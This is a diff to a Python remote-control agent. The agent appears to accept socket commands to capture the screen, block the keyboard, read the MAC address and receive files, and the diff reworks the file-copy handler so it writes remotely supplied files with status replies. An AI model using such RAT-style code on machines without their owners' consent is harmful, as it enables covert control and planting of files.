@@ -1,5 +1,4 @@
 import socket
-from sys import getdefaultencoding
 from PIL import ImageGrab
 import base64
 import os
@@ -99,27 +98,25 @@ def connect():
                 except:
                     conn.sendall(bytes("fail", "utf8"))
             elif encodedData == "-copyFile-":
-                fileName = ""
+                fileName = conn.recv(1024).decode("utf8")
                 try:
-                    fileName = conn.recv(1024).decode("utf8")
+                    with open(fileName, 'wb') as f:
+                        conn.sendall(bytes("opensuccess", "utf8"))
+                        while True:
+                            byteRead = b''
+                            try:
+                                byteRead = conn.recv(1024)
+                            except:
+                                conn.sendall(bytes("fail", "utf8"))
+                                break
+                            if byteRead == b'_end_':
+                                conn.sendall(bytes("success", "utf8"))
+                                break
+                            f.write(byteRead)
+                        f.close()
                 except:
-                    pass
-                with open(fileName, 'wb') as f:
-                    while True:
-                        byteRead = b''
-                        try:
-                            byteRead = conn.recv(1024)
-                        except:
-                            break
-                        if byteRead == b'_end_':
-                            break
-                        f.write(byteRead)                        
-                    f.close()
-                try:
-                    conn.sendall(bytes("-copySuccess-", "utf8"))
-                except:
-                    pass
-                        
+                    conn.sendall(bytes("openfail", "utf8"))
+
             elif encodedData == "-getmac-":
                 conn.sendall(bytes(gma(), "utf8"))
             elif encodedData == "-blockKeyboard-":
